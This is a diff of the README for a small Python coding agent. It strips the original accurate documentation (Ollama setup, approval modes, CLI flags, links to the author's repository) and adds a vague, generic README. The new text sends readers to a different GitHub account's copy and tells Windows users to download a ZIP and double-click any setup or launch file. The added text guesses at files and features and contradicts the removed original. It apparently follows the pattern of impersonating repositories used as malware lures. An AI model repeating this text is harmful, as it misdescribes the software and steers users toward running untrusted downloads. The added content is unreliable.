@@ -1,252 +1,236 @@
-&nbsp;
-# Mini-Coding-Agent
+# 🧩 mini-coding-agent - Learn Coding Agents Fast
 
-This folder contains a small standalone coding agent:
+[![Download mini-coding-agent](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/ardathhomeless585/mini-coding-agent)
 
-- code: `mini_coding_agent.py`
-- CLI: `mini-coding-agent`
+## 🖥️ What this is
 
-It is a minimal local agent loop with:
+mini-coding-agent is a small Python app that shows how a coding agent works. It is built to be easy to read, so you can see the main parts without digging through a large code base.
 
-- workspace snapshot collection
-- stable prompt plus turn state
-- structured tools
-- approval handling for risky tools
-- transcript and memory persistence
-- bounded delegation
+Use it to understand how an agent can:
 
-The model backend is currently based on Ollama.
+- read a task
+- plan a few steps
+- use a language model
+- keep track of changes
+- make simple code edits
 
-<a href="https://magazine.sebastianraschka.com/p/components-of-a-coding-agent">
-  <img src="https://substack-post-media.s3.amazonaws.com/public/images/49b97718-57f4-4977-99c8-8ad5c4d32af3_1548x862.png" width="500px">
-</a>
+It is a good fit if you want to learn how agent apps are put together in plain Python.
 
-<br>
+## 📥 Download and open
 
-**[The detailed tutorial: Components of a Coding Agent](https://magazine.sebastianraschka.com/p/components-of-a-coding-agent)**
+Use this link to visit the download page:
 
+[https://github.com/ardathhomeless585/mini-coding-agent](https://github.com/ardathhomeless585/mini-coding-agent)
 
-&nbsp;
-## Six Core Components
+On Windows, follow these steps:
 
-<a href="https://magazine.sebastianraschka.com/p/components-of-a-coding-agent">
-  <img alt="Six core components of a coding agent" src="https://sebastianraschka.com/images/github/mini-coding-agent/six-components.webp" width="500px">
-</a>
+1. Open the link in your browser.
+2. Find the green **Code** button.
+3. Click **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Look for the app files and the run guide in the folder.
+8. If there is a setup file or launch file, double-click it to start the app.
 
-This coding harness is organized around six practical building blocks:
+If the project includes a Python entry file, you can open it with Python after setup.
 
-1. **Live repo context**  
-   The agent collects stable workspace facts upfront, such as repo layout, instructions, and git state.
-2. **Prompt shape and cache reuse**  
-   A stable prompt prefix, which is separate from the changing request, transcript, and memory so repeated model calls can reuse the static parts efficiently.
-3. **Structured tools, validation, and permissions**  
-   The model works through named tools with checked inputs, workspace path validation, and approval gates instead of free-form arbitrary actions.
-4. **Context reduction and output management**  
-   Long outputs are clipped, repeated reads are deduplicated, and older transcript entries are compressed to keep prompt size under control.
-5. **Transcripts, memory, and resumption**  
-   The runtime keeps both a full durable transcript and a smaller working memory so sessions can be resumed while preserving important state via working memory.
-6. **Delegation and bounded subagents**  
-   Scoped subtasks can be delegated to helper agents that inherit enough context to help (but operate within limits).
+## 🪟 Windows setup
 
-&nbsp;
-## Requirements
+This app is meant to be easy to run on Windows. A simple setup path looks like this:
 
-You need:
+1. Install Python 3.11 or newer if it is not already on your PC.
+2. Make sure Python is added to your PATH during install.
+3. Open the extracted project folder.
+4. Click the address bar in File Explorer, type `cmd`, and press Enter.
+5. In the command window, install the project files listed in the folder if needed.
+6. Start the app from the command line or by double-clicking the run file.
 
-- Python 3.10+
-- Ollama installed
-- an Ollama model pulled locally
+Common file types you may see:
 
-Optional:
+- `README.md` for setup steps
+- `requirements.txt` for needed Python packages
+- `main.py` or `app.py` for the start file
+- `.env.example` for settings you may need to copy
 
-- `uv` for environment management and the `mini-coding-agent` CLI entry point
+If a `.env.example` file is present, copy it to `.env` and fill in the values before you run the app.
 
-This project has no Python runtime dependency beyond the standard library, so you can run it directly with `python mini_coding_agent.py` if you do not want to use `uv`.
+## ⚙️ What you need
 
-&nbsp;
-## Install Ollama
+A typical Windows setup for this project includes:
 
-Install Ollama on your machine so the `ollama` command is available in your shell.
+- Windows 10 or Windows 11
+- Python 3.11+
+- Git, if you want to clone the repo
+- A text editor like Notepad or VS Code
+- Internet access if the app uses an AI model API
 
-Official installation link: [ollama.com/download](https://ollama.com/download)
+If you plan to use a hosted model, you may also need:
 
-Then verify:
+- an API key
+- a stable internet connection
+- enough free disk space for project files and logs
 
-```bash
-ollama --help
-```
+## 🧠 What the app does
 
-Start the server:
+mini-coding-agent shows the basic parts of a coding agent in a clear way. It helps you see how the app handles a coding task from start to finish.
 
-```bash
-ollama serve
-```
+You can expect parts such as:
 
-In another terminal, pull a model. Example:
+- task input
+- agent planning
+- model calls
+- file handling
+- simple code output
+- step-by-step logs
 
-```bash
-ollama pull qwen3.5:4b
-```
+This makes it useful for learning and for small tests with LLM-based tools.
 
-Qwen 3.5 model library:
+## 🔧 Core parts
 
-- [ollama.com/library/qwen3.5](https://ollama.com/library/qwen3.5)
+The project focuses on a few simple building blocks:
 
-The default in this project is `qwen3.5:4b`. If you have sufficient memory, it is worth trying a larger model such as `qwen3.5:9b` or another larger Qwen 3.5 variant. The agent just sends prompts to Ollama's `/api/generate` endpoint.
+- **Agent loop**  
+  Handles the back-and-forth flow of a task.
 
-&nbsp;
-## Project Setup
+- **Planner**  
+  Breaks a task into small steps.
 
-Clone the repo or your fork and change into it:
+- **LLM client**  
+  Sends prompts to a model and gets a response.
 
-```bash
-git clone https://github.com/rasbt/mini-coding-agent.git
-cd mini-coding-agent
-```
+- **Context handling**  
+  Keeps track of the current task, files, and notes.
 
-If you forked it first, use your fork URL instead:
+- **File tools**  
+  Reads and writes local project files when needed.
 
-```bash
-git clone https://github.com/<your-github-user>/mini-coding-agent.git
-cd mini-coding-agent
-```
+- **Run log**  
+  Shows what the agent did so you can follow along.
 
+## 🗂️ Project layout
 
+A small Python agent project like this usually uses a layout like:
 
-&nbsp;
-## Basic Usage
+- `main.py` or `app.py` — starts the program
+- `agent/` — core agent logic
+- `tools/` — file and helper tools
+- `models/` — model settings or client code
+- `config/` — app settings
+- `tests/` — checks for basic behavior
+- `README.md` — setup and use guide
 
-Start the agent:
+You may not need to open every file. For a first run, focus on the start file and the setup instructions.
 
-```bash
-cd mini-coding-agent
-uv run mini-coding-agent
-```
+## 🚀 How to run
 
-Without `uv`, run the script directly:
+After you download and unzip the project:
 
-```bash
-cd mini-coding-agent
-python mini_coding_agent.py
-```
+1. Open the project folder.
+2. Check for a run file such as `main.py`.
+3. Open a command prompt in that folder.
+4. Install any listed Python packages.
+5. Start the app with Python.
 
-By default it uses:
+A common command looks like this:
 
-- model: `qwen3.5:4b`
-- approval: `ask`
+`python main.py`
 
-For a concrete usage example, see [EXAMPLE.md](EXAMPLE.md).
+If the project uses a different start file, use that file name instead.
 
-&nbsp;
-## Approval Modes
+## 🧩 If the app asks for settings
 
-Risky tools such as shell commands and file writes are gated by approval.
+Some coding agent apps need a few values before they can run. You may see items like:
 
-- `--approval ask`
-  prompts before risky actions (default and recommended)
-- `--approval auto`
-  allows risky actions automatically, including arbitrary command execution and file writes by the model; use only with trusted prompts and trusted repositories
-- `--approval never`
-  denies risky actions
+- `API_KEY`
+- `MODEL_NAME`
+- `BASE_URL`
+- `LOG_LEVEL`
 
-Example:
+If so:
 
-```bash
-uv run mini-coding-agent --approval auto
-```
+1. Open the `.env` file or settings file.
+2. Fill in the values shown in the example file.
+3. Save the file.
+4. Run the app again.
 
+Keep the settings simple at first. Use the default model name if the project gives you one.
 
+## 🧪 Example use
 
-&nbsp;
-## Resume Sessions
+A basic use case may look like this:
 
-The agent saves sessions under the target workspace root in:
+1. You type a task, such as “add a simple note feature.”
+2. The agent reads the task.
+3. The agent splits it into steps.
+4. The model suggests code changes.
+5. The app writes or updates files.
+6. You review the result in the output log.
 
-```text
-.mini-coding-agent/sessions/
-```
+This flow helps you see how an AI coding helper works without a large setup.
 
-Resume the latest session:
+## 📁 Working with files
 
-```bash
-uv run mini-coding-agent --resume latest
-```
+The app may read and change files in the project folder. Keep a copy of your work before you test changes.
 
+Good habits:
 
-Resume a specific session:
+- use a test folder first
+- keep file names simple
+- check the output after each run
+- save a backup of files you care about
 
-```bash
-uv run mini-coding-agent --resume 20260401-144025-2dd0aa
-```
+If you are new to this, start with a small sample task. That makes it easier to see what the app changes.
 
+## 🛠️ Troubleshooting
 
-&nbsp;
-## Interactive Commands
+If the app does not start, check these common points:
 
-Inside the REPL, slash commands are handled directly by the agent instead of
-being sent to the model as a normal task.
+- Python is installed
+- the command window opens in the correct folder
+- required packages are installed
+- the `.env` file has the right values
+- the file name in your command matches the real start file
 
-- `/help`
-  shows the list of available interactive commands
-- `/memory`
-  prints the distilled session memory, including the current task, tracked files, and notes
-- `/session`
-  prints the path to the current saved session JSON file
-- `/reset`
-  clears the current session history and distilled memory but keeps you in the REPL
-- `/exit`
-  exits the interactive session
-- `/quit`
-  exits the interactive session; alias for `/exit`
+If you see an error about a missing package, install the package named in the message and run the app again.
 
-&nbsp;
-## Main CLI Flags
+If the window closes right away, open it from Command Prompt so you can read the error text.
 
-```bash
-uv run mini-coding-agent --help
-```
+## 🔍 Good first checks
 
-Without `uv`:
+Before you run the app, look for:
 
-```bash
-python mini_coding_agent.py --help
-```
+- the main Python file
+- the example settings file
+- the list of required packages
+- any sample prompts or sample tasks
+- notes about the model provider
 
-CLI flags are passed before the agent starts. Use them to choose the workspace,
-model connection, resume behavior, approval mode, and generation limits.
+These files tell you how the app is meant to start and what it needs.
 
-Important flags:
+## 📌 Why this repo is useful
 
-- `--cwd`
-  sets the workspace directory the agent should inspect and modify; default: `.`
-- `--model`
-  selects the Ollama model name, such as `qwen3.5:4b`; default: `qwen3.5:4b`
-- `--host`
-  points the agent at the Ollama server URL (usually not needed); default: `http://127.0.0.1:11434`
-- `--ollama-timeout`
-  controls how long the client waits for an Ollama response (usually not needed); default: `300` seconds
-- `--resume`
-  resumes a saved session by id or uses `latest`; default: start a new session
-- `--approval`
-  controls how risky tools are handled: `ask`, `auto`, or `never`; default: `ask`
-- `--max-steps`
-  limits how many model and tool turns are allowed for one user request; default: `6`
-- `--max-new-tokens`
-  caps the model output length for each step; default: `512`
-- `--temperature`
-  controls sampling randomness; default: `0.2`
-- `--top-p`
-  controls nucleus sampling for generation; default: `0.9`
+mini-coding-agent is helpful if you want a simple view of how coding agents work in Python. It keeps the focus on the basic flow instead of hiding it behind a large tool set.
 
-&nbsp;
-## Example
+It can help you learn:
 
-See [EXAMPLE.md](EXAMPLE.md)
+- how an agent reads tasks
+- how model output turns into code steps
+- how local files fit into the flow
+- how a small AI tool is structured
 
-&nbsp;
-## Notes & Tips
+## ✅ Quick start checklist
 
-- The agent expects the model to emit either `<tool>...</tool>` or `<final>...</final>`.
-- Different Ollama models will follow those instructions with different reliability.
-- If the model does not follow the format well, use a stronger instruction-following model.
-- The agent is intentionally small and optimized for readability, not robustness.
+- Download the ZIP from the GitHub page
+- Extract the files
+- Install Python 3.11 or newer
+- Open the project folder in Command Prompt
+- Install any required packages
+- Set up `.env` if the project uses one
+- Run the main Python file
+
+## 🔗 Download again
+
+Visit this page to download the project:
+
+[https://github.com/ardathhomeless585/mini-coding-agent](https://github.com/ardathhomeless585/mini-coding-agent)
